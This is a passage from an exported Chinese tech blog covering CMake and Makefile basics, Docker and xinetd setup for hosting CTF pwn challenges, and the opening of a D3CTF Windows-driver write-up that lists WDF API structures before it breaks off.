<h3 id="version4"><a href="#version4" class="headerlink" title="version4"></a>version4</h3><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CXX = g++</span><br><span class="line">TARGET = hello </span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件下所有的cpp</span></span><br><span class="line">SRC = <span class="variable">$(<span class="built_in">wildcard</span> *.cpp)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 意思为 SRC中的.cpp替换为.o</span></span><br><span class="line">OBJ = <span class="variable">$(<span class="built_in">patsubst</span> %.cpp, %.o, <span class="variable">$(SRC)</span>)</span></span><br><span class="line"></span><br><span class="line">CXXFLAGS = -c -Wall</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>: <span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -o <span class="variable">$@</span> <span class="variable">$^</span></span><br><span class="line"></span><br><span class="line"><span class="section">%.o: %.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$(CXXFLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -f *.o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure>
<h2 id="CMake"><a href="#CMake" class="headerlink" title="CMake"></a>CMake</h2><p>Linux 命令行，cmake <strong>生成 makefile</strong>，然后在 make 生成可执行文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cmake .</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure>

<p>Windows 命令行</p>
<ol>
<li>MinGW 环境，不是我的选择， MSVC</li>
<li>CMake，首先生成缓存，最后编译</li>
</ol>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">cmake <span class="literal">-B</span> build</span><br><span class="line">cmake <span class="literal">--build</span> build</span><br></pre></td></tr></table></figure>

<p>配合 VsCode 使用</p>
<p>Ctrl + shift + p 进入命令 ： cmake build 就能生成build 目录，出现我们的需要的exe文件</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>最简单的 CmakeLists</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment">#[[ cmake 版本要求 ]]</span></span><br><span class="line"><span class="keyword">cmake_minimum_required</span> (VERSION <span class="number">3.0</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ 工程名 ]]</span></span><br><span class="line"><span class="keyword">project</span> (<span class="keyword">test</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ 可执行文件 ]]</span></span><br><span class="line"><span class="keyword">add_executable</span> (main main.cpp)</span><br></pre></td></tr></table></figure>

<p>set 设置变量</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span>(SRC main.cpp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">add_executable</span> (main <span class="variable">$&#123;SRC&#125;</span>)</span><br></pre></td></tr></table></figure>

<p>C&#x2F;C++ 标准 比如 <code>-std=c99</code></p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span>(CMAKE_C_STANDARD <span class="number">11</span>)</span><br><span class="line"><span class="keyword">set</span>(CMAKE_CXX_STANDARD <span class="number">11</span>)</span><br></pre></td></tr></table></figure>

<p>file</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment">#[[ 匹配所有的文件名 ]]</span></span><br><span class="line"><span class="keyword">file</span>(GLOB &lt;variable&gt; [LIST_DIRECTORIES <span class="keyword">true</span>[<span class="keyword">false</span>]] [RELATIVE &lt;path&gt; ] [CONFIGURE_DEPENDS] [&lt;globbing-expression&gt; ...])</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ 将 /usr/lib/inlcude/ 下所有 c文件 赋值给 SRC ]]</span></span><br><span class="line"><span class="keyword">file</span>(GLOB SRC /usr/lib/inlcude/*.c)</span><br></pre></td></tr></table></figure>

<p>宏</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment">#[[ 当前CMakeLists所在文件夹 ]]</span></span><br><span class="line">CMAKE_CURRENT_SOURCE_DIR </span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ 最外层CMakeLists.txt所在目录 ]]</span></span><br><span class="line">CMAKE_SOURCE_DIR</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ 离 CMakeLists.txt 最近的一层文件夹 ]]</span></span><br><span class="line">PROJECT_SOURCE_DIR</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ 二进制文件输出路径，可自行set ]]</span></span><br><span class="line">EXECUTABLE_OUTPUT_PATH</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ 库输出路径 ]]</span></span><br><span class="line">LIBRARY_OUTPUT_PATH</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ 编译器编译选项 ]]</span></span><br><span class="line">CMAKE_CXX_FLAGS</span><br></pre></td></tr></table></figure>

<p>打印信息</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">message</span>()</span><br></pre></td></tr></table></figure>

<p>制作链接库</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">add_library</span>(&lt;name&gt; [STATIC | SHARED | MODULE]</span><br><span class="line">            [EXCLUDE_FROM_ALL]</span><br><span class="line">            [source1] [source2 ...])</span><br><span class="line"><span class="comment">#[[ STATIC(静态库) SHARED(动态库) MODULE(模块库) ]]</span></span><br></pre></td></tr></table></figure>

<p>添加库，类似于 <code>gcc -lpthread</code></p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">target_link_libraries</span>(main pthread)</span><br></pre></td></tr></table></figure>

<h3 id="多文件夹"><a href="#多文件夹" class="headerlink" title="多文件夹"></a>多文件夹</h3><p>包含头文件</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include_directories</span>(<span class="variable">$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;</span>/<span class="keyword">include</span>/)</span><br></pre></td></tr></table></figure>

<p>包含源文件：file</p>
<p>多个可执行文件，比如简单的 web 服务器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ tree</span><br><span class="line">server</span><br><span class="line">|-- client</span><br><span class="line">|	|-- client.c</span><br><span class="line">|	|-- CMakeLists.txt</span><br><span class="line">|-- server</span><br><span class="line">|	|-- server.c</span><br><span class="line">|	|-- CMakeLists.txt</span><br><span class="line">|-- CMakeLists.txt</span><br></pre></td></tr></table></figure>


<p>添加子目录，要求子目录必须含有 CmakeLists.txt</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment">#[[ 包含子目录 ]]</span></span><br><span class="line"><span class="keyword">add_subdirectory</span>(client)</span><br></pre></td></tr></table></figure>

<p>最外层</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cmake_minimum_required</span> (VERSION <span class="number">3.0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">project</span> (tftp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">add_subdirectory</span>(client)                </span><br><span class="line"><span class="keyword">add_subdirectory</span>(server)</span><br></pre></td></tr></table></figure>

<p>clent &amp; server</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cmake_minimum_required</span> (VERSION <span class="number">3.0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">project</span> (server)</span><br><span class="line"><span class="keyword">add_executable</span> (server server.cpp)</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[-----------------------------]]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">cmake_minimum_required</span> (VERSION <span class="number">3.0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">project</span> (client)</span><br><span class="line"><span class="keyword">add_executable</span> (client client.cpp)</span><br></pre></td></tr></table></figure>

<h3 id="编译成库"><a href="#编译成库" class="headerlink" title="编译成库"></a>编译成库</h3><p>将include编译成库，然后在编译时指定库 (packet: 网络数据包，在client 和 server 都会使用)</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ADD_LIBRARY</span>(packet STATIC packet.cpp)</span><br></pre></td></tr></table></figure>

<p>项目添加动态链接库：包含库 + 二进制文件链接</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">link_directories</span>(</span><br><span class="line">    <span class="variable">$&#123;CMAKE_SOURCE_DIR&#125;</span>/lib</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">target_link_libraries</span>(client PUBLIC packet)</span><br></pre></td></tr></table></figure>

<h3 id="添加cpp文件"><a href="#添加cpp文件" class="headerlink" title="添加cpp文件"></a>添加cpp文件</h3><p>或许最简单，我们也可以使用其他的宏和函数获取cpp文件添加</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">add_executable</span> (client client.cpp <span class="variable">$&#123;CMAKE_SOURCE_DIR&#125;</span>/packet/packet.cpp)</span><br></pre></td></tr></table></figure>

<h2 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h2><blockquote>
<p>主要是在 vscode 中配合 LLVM 工具链进行debug。~~CLion 啥都有🫢 ~~</p>
</blockquote>
<p>环境：vscode + llvm + clangd插件 + code-lldb插件</p>
<ul>
<li>写好一个cmake工程</li>
</ul>
<p>f5 进行调试，需要文件夹下有一个 <code>.vscode</code> 文件夹，配置<code>launch.json</code>。其中有一个属性：<code>program</code> 修改为我们的生成的二进制文件就行</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">       <span class="punctuation">&#123;</span></span><br><span class="line">           <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lldb&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;windows&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;/build/Debug/test.exe&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;&quot;</span></span><br><span class="line">       <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="punctuation">]</span></span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>

<p>lldb 指令和 gdb 类似，我们可以在下面的 debug 窗口 进行单步执行</p>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>cmake</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF出题</title>
    <url>/2023/09/16/CTF%E5%87%BA%E9%A2%98%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<blockquote>
<p>怎么出题部署环境？</p>
</blockquote>
<span id="more"></span>

<h3 id="docker部署"><a href="#docker部署" class="headerlink" title="docker部署"></a>docker部署</h3><ol>
<li>首先肯定是安装docker</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install docker.io</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>写题目</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chall</span><br><span class="line">├── flag.txt</span><br><span class="line">├── vuln</span><br><span class="line">├── vuln.c</span><br><span class="line">└── Makefile</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>docker 部署，在同级目录添加 Dockerfile，同时配合 xinetd<ul>
<li>修改文件中内容，看注释</li>
</ul>
</li>
</ol>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span></span><br><span class="line"><span class="keyword">ENV</span> DEBIAN_FRONTEND noninteractive</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get -y update --fix-missing &amp;&amp; apt-get -y dist-upgrade</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get -y install lib32z1 xinetd</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> groupadd -r pwn &amp;&amp; useradd -r -g pwn pwn</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;#!/bin/bash\n    \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">service xinetd restart &amp;&amp; /bin/sleep infinity&#x27;</span> &gt; /etc/init.sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###### change server</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;service pwn\n       \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">&#123;\n                           \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  type = UNLISTED\n           \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  disable = no\n              \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  socket_type = stream\n      \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  protocol = tcp\n            \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  wait = no\n                 \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  user = pwn\n                \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  bind = 0.0.0.0\n            \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  port = 9999\n               \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  server = /home/pwn/vuln\n   \         </span></span></span><br><span class="line">&#125;<span class="string">&#x27; &gt; /etc/xinetd.d/pwn</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">RUN chmod 500 /etc/init.sh</span></span><br><span class="line"><span class="string">RUN chmod 444 /etc/xinetd.d/pwn </span></span><br><span class="line"><span class="string">RUN chmod 1733 /tmp /var/tmp /dev/shm</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ADD chall/flag.txt /flag.txt            ####### change flag</span></span><br><span class="line"><span class="string">RUN chmod 444 /flag.txt               </span></span><br><span class="line"><span class="string">RUN mv /flag.txt /flag-$(md5sum flag.txt | awk &#x27;</span>&#123;print $<span class="number">1</span>&#125;<span class="string">&#x27;).txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">WORKDIR /home/pwn</span></span><br><span class="line"><span class="string">ADD chall/vuln .                        ###### change chall file</span></span><br><span class="line"><span class="string">RUN chmod 550 vuln</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">RUN chown -R root:pwn /home/pwn</span></span><br><span class="line"><span class="string">RUN service xinetd restart</span></span><br></pre></td></tr></table></figure>

<ol start="4">
<li>docker-compose.yml<ul>
<li>自己更改端口就行</li>
</ul>
</li>
</ol>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">vuln:</span>                       <span class="comment"># change name</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">ulimits:</span></span><br><span class="line">      <span class="attr">nproc:</span> <span class="number">65535</span></span><br><span class="line">      <span class="attr">core:</span> <span class="number">0</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;1234:9999&quot;</span>           <span class="comment"># change port</span></span><br><span class="line">    <span class="attr">entrypoint:</span> <span class="string">/etc/init.sh</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up</span><br></pre></td></tr></table></figure>

<p><strong>坑点</strong>：docker部署题目时，在程序里必须将缓冲器置为0，否则不会显示？</p>
<h3 id="ctf-xinetd"><a href="#ctf-xinetd" class="headerlink" title="ctf_xinetd"></a>ctf_xinetd</h3><p>下载这个链接 <a href="https://github.com/Eadom/ctf_xinetd">ctf_xinetd</a>，部署比较简单。</p>
<ul>
<li>修改 bin目录 里的 二进制文件和 flag 文件</li>
<li>dockerfile 修改一行</li>
</ul>
<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cp</span> -R /lib* /home/ctf &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> -R /usr/lib* /home/ctf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 改为</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cp</span> -R /usr/lib* /home/ctf</span></span><br></pre></td></tr></table></figure>

<p>ctf.xinetd 修改</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server_args = --userspec=1000:1000 /home/ctf ./helloworld</span><br><span class="line"></span><br><span class="line"># 修改</span><br><span class="line">server_args = --userspec=1000:1000 /home/ctf 自己的漏洞程序</span><br></pre></td></tr></table></figure>

<p>最后执行README 里的 两条命令就行，比如</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -t <span class="string">&quot;vuln&quot;</span> .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将pub_port 自己想要的端口</span></span><br><span class="line">docker run -d -p <span class="string">&quot;0.0.0.0:pub_port:9999&quot;</span> -h <span class="string">&quot;vuln&quot;</span> --name=<span class="string">&quot;vuln&quot;</span> vuln</span><br></pre></td></tr></table></figure>


<p>查看了一眼其内容，使用 chroot沙盒，将文件系统的根目录转化为原先的 <code>/home/ctf</code> 目录，所以要在dockerfile中将lib全部拷贝一份</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server      = /usr/sbin/chroot</span><br></pre></td></tr></table></figure>

<h3 id="pwn-deploy-chroot"><a href="#pwn-deploy-chroot" class="headerlink" title="pwn_deploy_chroot"></a>pwn_deploy_chroot</h3><ul>
<li>部署多道ctf题目： <a href="https://github.com/giantbranch/pwn_deploy_chroot">giantbranch&#x2F;pwn_deploy_chroot</a>，<a href="http://www.giantbranch.cn/2018/09/24/%E5%A6%82%E4%BD%95%E5%AE%89%E5%85%A8%E5%BF%AB%E9%80%9F%E5%9C%B0%E9%83%A8%E7%BD%B2%E5%A4%9A%E9%81%93ctf%20pwn%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/">教程</a> 写的很详细。使用起来也很容易</li>
</ul>
<h3 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h3><ul>
<li>内核题目部署，使用 ctf_xinetd 举例</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chall  </span><br><span class="line">├── ctf.xinetd  </span><br><span class="line">├── Dockerfile  </span><br><span class="line">├── bin  </span><br><span class="line">│ ├── run.sh  </span><br><span class="line">│ ├── bzImage  </span><br><span class="line">│ └── rootfs.cpio  </span><br><span class="line">├── README.md</span><br><span class="line">└── start.sh </span><br></pre></td></tr></table></figure>

<p>docker 安装环境</p>
<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span>  </span><br><span class="line"></span><br><span class="line">DEBIAN_FRONTEND=noninteractive</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list &amp;&amp; \  </span></span><br><span class="line">	apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \  </span><br><span class="line">	apt-get install -y lib32z1 xinetd git libglib2.<span class="number">0</span>-dev libfdt-dev \</span><br><span class="line">	libpixman-<span class="number">1</span>-dev zlib1g-dev qemu qemu-system-x86  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> useradd -m pwn</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./ctf.xinetd /etc/xinetd.d/ctf</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./start.sh /start.sh </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;Blocked by ctf_xinetd&quot;</span> &gt; /etc/banner_fail</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /start.sh  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./chall/ /  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/run.sh&quot;</span>]  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">25000</span></span><br></pre></td></tr></table></figure>

<p>重要的是修改 ctf.xinetd  文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service ctf  </span><br><span class="line">&#123;  </span><br><span class="line"><span class="built_in">disable</span> = no  </span><br><span class="line">socket_type = stream  </span><br><span class="line">protocol = tcp  </span><br><span class="line"><span class="built_in">wait</span> = no  </span><br><span class="line">user = pwn  </span><br><span class="line"><span class="built_in">type</span> = UNLISTED  </span><br><span class="line">port = 25000  </span><br><span class="line"><span class="built_in">bind</span> = 0.0.0.0  </span><br><span class="line">server = /run.sh    <span class="comment"># 修改处</span></span><br><span class="line"><span class="comment"># replace helloworld to your program  </span></span><br><span class="line">banner_fail = /etc/banner_fail  </span><br><span class="line"><span class="comment"># safety options  </span></span><br><span class="line">per_source = 10 <span class="comment"># the maximum instances of this service per source IP address  </span></span><br><span class="line">rlimit_cpu = 20 <span class="comment"># the maximum number of CPU seconds that the service may use  </span></span><br><span class="line"><span class="comment">#rlimit_as = 1024M # the Address Space resource limit for the service  </span></span><br><span class="line"><span class="comment">#access_times = 2:00-9:00 12:00-24:00  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>D3CTF-d3lgfs</title>
    <url>/2024/04/30/D3CTF-d3lgfs/</url>
    <content><![CDATA[<blockquote>
<p>WDF PWN</p>
</blockquote>
<p>看起来作者深受 CLFS.sys 迫害</p>
<h2 id="WDF-框架"><a href="#WDF-框架" class="headerlink" title="WDF 框架"></a>WDF 框架</h2><p>学！<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/wdf/">Windows Driver Frameworks</a></p>
<h3 id="DeviceEntry"><a href="#DeviceEntry" class="headerlink" title="DeviceEntry"></a>DeviceEntry</h3><p>依然是入口</p>
<ul>
<li>添加WDF Device的回调函数</li>
<li>创建WDF Driver</li>
</ul>
<h3 id="WDF-XXX"><a href="#WDF-XXX" class="headerlink" title="WDF_XXX"></a>WDF_XXX</h3><h4 id="WDFDRIVER"><a href="#WDFDRIVER" class="headerlink" title="WDFDRIVER"></a>WDFDRIVER</h4><h4 id="WDF-DRIVER-CONFIG"><a href="#WDF-DRIVER-CONFIG" class="headerlink" title="WDF_DRIVER_CONFIG"></a>WDF_DRIVER_CONFIG</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WDF_DRIVER_CONFIG</span> &#123;</span><br><span class="line">  ULONG                     Size;</span><br><span class="line">  PFN_WDF_DRIVER_DEVICE_ADD EvtDriverDeviceAdd;</span><br><span class="line">  PFN_WDF_DRIVER_UNLOAD     EvtDriverUnload;</span><br><span class="line">  ULONG                     DriverInitFlags;</span><br><span class="line">  ULONG                     DriverPoolTag;</span><br><span class="line">&#125; WDF_DRIVER_CONFIG, *PWDF_DRIVER_CONFIG;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">WDF_DRIVER_CONFIG_INIT</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PWDF_DRIVER_CONFIG        Config,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] PFN_WDF_DRIVER_DEVICE_ADD EvtDriverDeviceAdd</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>


<p>创建驱动</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">WdfDriverCreate</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            PDRIVER_OBJECT         DriverObject,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            PCUNICODE_STRING       RegistryPath,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]  PWDF_OBJECT_ATTRIBUTES DriverAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            PWDF_DRIVER_CONFIG     DriverConfig,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] WDFDRIVER              *Driver</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<h4 id="WDFDEVICE"><a href="#WDFDEVICE" class="headerlink" title="WDFDEVICE"></a>WDFDEVICE</h4><p>创建设备 </p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">WDFDEVICE_INIT *DeviceInita</span><br></pre></td></tr></table></figure>

<p>GUID interface</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">WdfDeviceCreateDeviceInterface</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           WDFDEVICE        Device,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           <span class="type">const</span> GUID       *InterfaceClassGUID,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] PCUNICODE_STRING ReferenceString</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>KMDF也可以指定symlink，这就与WDM类似了</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">WdfDeviceCreateSymbolicLink</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] WDFDEVICE        Device,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PCUNICODE_STRING SymbolicLinkName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<h4 id="IO-Queue"><a href="#IO-Queue" class="headerlink" title="IO Queue"></a>IO Queue</h4><p>初始化</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">WDF_IO_QUEUE_CONFIG_INIT_DEFAULT_QUEUE</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [out] PWDF_IO_QUEUE_CONFIG       Config,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  WDF_IO_QUEUE_DISPATCH_TYPE DispatchType</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> <span class="title class_">_WDF_IO_QUEUE_DISPATCH_TYPE</span> &#123;</span><br><span class="line">  WdfIoQueueDispatchInvalid = <span class="number">0</span>,</span><br><span class="line">  WdfIoQueueDispatchSequential,</span><br><span class="line">  WdfIoQueueDispatchParallel,</span><br><span class="line">  WdfIoQueueDispatchManual,</span><br><span class="line">  WdfIoQueueDispatchMax</span><br><span class="line">&#125; WDF_IO_QUEUE_DISPATCH_TYPE;</span><br></pre></td></tr></table></figure>

<p><code>_WDF_IO_QUEUE_CONFIG</code>结构</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WDF_IO_QUEUE_CONFIG</span> &#123;</span><br><span class="line">  ULONG                                       Size;</span><br><span class="line">  WDF_IO_QUEUE_DISPATCH_TYPE                  DispatchType;</span><br><span class="line">  WDF_TRI_STATE                               PowerManaged;</span><br><span class="line">  BOOLEAN                                     AllowZeroLengthRequests;</span><br><span class="line">  BOOLEAN                                     DefaultQueue;</span><br><span class="line">  PFN_WDF_IO_QUEUE_IO_DEFAULT                 EvtIoDefault;</span><br><span class="line">  PFN_WDF_IO_QUEUE_IO_READ                    EvtIoRead;</span><br><span class="line">  PFN_WDF_IO_QUEUE_IO_WRITE                   EvtIoWrite;</span><br><span class="line">  PFN_WDF_IO_QUEUE_IO_DEVICE_CONTROL          EvtIoDeviceControl;</span><br><span class="line">  PFN_WDF_IO_QUEUE_IO_INTERNAL_DEVICE_CONTROL EvtIoInternalDeviceControl;</span><br><span class="line">  PFN_WDF_IO_QUEUE_IO_STOP                    EvtIoStop;</span><br><span class="line">  PFN_WDF_IO_QUEUE_IO_RESUME                  EvtIoResume;</span><br><span class="line">  PFN_WDF_IO_QUEUE_IO_CANCELED_ON_QUEUE       EvtIoCanceledOnQueue;</span><br><span class="line">  <span class="keyword">union</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> 